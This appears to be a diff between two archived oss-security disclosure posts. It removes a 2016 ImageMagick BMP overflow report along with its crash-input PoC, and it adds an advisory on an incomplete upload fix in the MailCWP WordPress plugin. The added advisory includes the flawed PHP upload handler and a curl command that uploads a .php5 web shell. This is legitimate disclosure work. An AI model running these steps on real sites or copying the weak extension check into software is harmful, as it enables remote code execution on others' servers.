@@ -1,42 +1,54 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2016/09/26/3
-Message-ID: <2A704EDCB5C64F40AF988060A961492BBB311E@EXMBX-TJ007.tencent.com>
-Date: Mon, 26 Sep 2016 05:17:41 +0000
-From: pwchen(陈佩文) <pwchen@...cent.com>
-To: oss-security <oss-security@...ts.openwall.com>
-Subject: CVE-2016-6823 - ImageMagick BMP Coder Out-Of-Bounds Write Vulnerability
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2016/11/08/4
+Message-id: <56E1DCC7-3614-4AE7-AC63-1DF82CF64852@me.com>
+Date: Tue, 08 Nov 2016 05:40:55 -0500
+From: "Larry W. Cashdollar" <larry0@...com>
+To: Open Source Security <oss-security@...ts.openwall.com>
+Subject: Mailcwp remote file upload vulnerability incomplete fix v1.100
 Content-Type: text/plain; charset=utf-8
 
-Hi.
+Title: Mailcwp remote file upload vulnerability incomplete fix v1.100
+Author: Larry W. Cashdollar, @_larry0
+Date: 2016-11-01
+Download Site: https://wordpress.org/plugins/mailcwp/
+Vendor: CadreWorks Pty Ltd
+Vendor Notified: 2016-11-01
+Vendor Contact: plugins@...dpress.org
+Description: MailCWP, Mail Client for WordPress. A full-featured mail client plugin providing webmail access through your WordPress blog or website.
+Vulnerability:
+I noticed CVE-2015-1000000 wasn't fixed correctly, _any_ authenticated user can upload a file to the WordPress installation, they can get .php code execution by changing the extension to .php[3-5], .pht or .phtml.
 
-This is PwChen of Tencent's Xuanwu Lab & RayZhong of Tencent's Keen Lab.
+My previous advisory:
 
-During our research, we found an Out-Of-Bounds write vulnerability in
-ImageMagick's BMP coders.
-
-When ImageMagick is converting other format to BMP format, it will
-pass image's height and width parameter into 'BMP coder'.
-
-There is an arithmetic overflow vulnerability when the BMP coder is
-calculating the image size by multiplying the height and width. This
-can directly cause an Out-Of-Bounds Write.
-
-The ImageMagick team has fixed the vulnerability we reported.
-
-Attached is a proof of concept.
-
-python -c 'print "P3\x0a14096\x201048576\x0a255\x00"' > PoC.ppm
-convert PoC.ppm crash.bmp
+http://www.vapidlabs.com/advisory.php?v=138
 
 
-Upstream fix:
-https://github.com/ImageMagick/ImageMagick/commit/e7094d16cd8aee6bb48cf1d369f617f7edf89993
-https://github.com/ImageMagick/ImageMagick/commit/4cc6ec8a4197d4c008577127736bf7985d632323
+require_once "../../../wp-load.php";
 
-Debian Bug report:
-https://bugs.debian.org/834504
+if (!is_user_logged_in()) {
+  die('{"ERROR": -1}');
+}
 
+$message_id = $_REQUEST["message_id"];
+$upload_dir = $_REQUEST["upload_dir"];
+if (empty($_FILES) || $_FILES["file"]["error"]) {
+  die('{"OK": 0}');
+}
+ 
+$fileName = $_FILES["file"]["name"];
+$ext = pathinfo($fileName, PATHINFO_EXTENSION);
+if ($ext == 'php') {
+  die('{"ERROR": -2}');
+}
+move_uploaded_file($_FILES["file"]["tmp_name"], "$upload_dir/$message_id-$fileName");
+ 
+die('{"OK": 1}');
 
-Regards,
-Peiwen Chen
-Tencent's Xuanwu Lab
+CVE-2016-1000156
+Exploit Code:
+	• Create any type of user and copy the contents of your cookie file for curl:
+	•  
+	• $ curl   -F "file=@...me/larry/shell.php5" "http://example.com/wp-content/plugins/mailcwp/mailcwp-upload.php?message_id=1" -F "upload_dir=/usr/share/wordpress/wp-content/uploads" --cookie cookie.txt 
+	• {"OK": 1}
+Advisory: www.vapidlabs.com/advisory.php?v=175
+Notes: Incomplete fix for CVE-2015-1000000
